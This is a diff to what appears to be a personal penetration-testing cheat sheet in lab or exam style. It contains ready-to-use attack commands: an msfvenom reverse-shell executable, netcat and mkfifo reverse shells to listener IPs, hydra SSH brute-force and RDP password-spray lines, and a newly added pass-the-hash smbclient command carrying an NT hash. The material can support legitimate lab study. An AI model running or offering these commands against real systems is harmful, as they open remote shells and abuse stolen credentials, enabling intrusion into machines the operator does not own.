@@ -69,7 +69,7 @@ touch /home/kali/webdav/test.txt
 /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 ```
 
-### Reverse shells
+#### Reverse shells
 ##### Simple reverse shell .exe for Windows
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o /tmp/<evil.exe>
@@ -91,6 +91,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.214 4444 >/tmp/
 nc -e /bin/sh 10.0.0.1 1234
 ```
 
+
+#### PowerShell
+##### Get local users
+```powershell
+Get-LocalUser
+```
 
 
 
@@ -1005,4 +1011,10 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<IP>
 ##### Spray Attack RDP
 ```bash
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+```
+
+
+##### Pass-the-Hash to SMB share
+```bash
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 ```
